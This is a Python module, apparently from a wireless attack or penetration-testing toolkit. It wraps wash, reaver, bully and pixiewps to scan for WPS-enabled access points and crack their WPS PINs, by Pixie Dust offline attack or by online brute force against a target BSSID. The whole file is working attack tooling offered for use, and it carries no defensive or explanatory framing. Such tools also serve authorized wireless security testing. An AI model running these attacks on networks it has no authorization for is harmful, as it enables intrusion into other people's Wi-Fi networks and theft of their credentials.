from typing import Optional

from ..utils import ToolError, run, run_quiet, which


def wash(iface: str, timeout: int = 30) -> str:
    if which("wash") is None:
        raise ToolError("wash not installed (apt install reaver)")
    return run(["timeout", str(timeout), "wash", "-i", iface]).stdout or ""


def reaver_pixie(iface: str, bssid: str, channel: Optional[int] = None) -> None:
    if which("reaver") is None:
        raise ToolError("reaver not installed")
    cmd = ["reaver", "-i", iface, "-b", bssid, "-vv", "-K", "1"]
    if channel is not None:
        cmd += ["-c", str(channel)]
    run_quiet(cmd)


def reaver_brute(iface: str, bssid: str, channel: Optional[int] = None,
                 delay: int = 1, pin: Optional[str] = None) -> None:
    if which("reaver") is None:
        raise ToolError("reaver not installed")
    cmd = ["reaver", "-i", iface, "-b", bssid, "-vv", "-d", str(delay)]
    if channel is not None:
        cmd += ["-c", str(channel)]
    if pin:
        cmd += ["-p", pin]
    run_quiet(cmd)


def bully(iface: str, bssid: str, channel: Optional[int] = None) -> None:
    if which("bully") is None:
        raise ToolError("bully not installed (apt install bully)")
    cmd = ["bully", iface, "-b", bssid, "-d", "-v", "3"]
    if channel is not None:
        cmd += ["-c", str(channel)]
    run_quiet(cmd)


def pixiewps(pke: str, pkr: str, e_hash1: str, e_hash2: str,
             authkey: str, e_nonce: str, r_nonce: str) -> str:
    if which("pixiewps") is None:
        raise ToolError("pixiewps not installed")
    return run([
        "pixiewps",
        "-e", pke, "-r", pkr,
        "-s", e_hash1, "-z", e_hash2,
        "-a", authkey,
        "-n", e_nonce, "-m", r_nonce,
    ]).stdout or ""
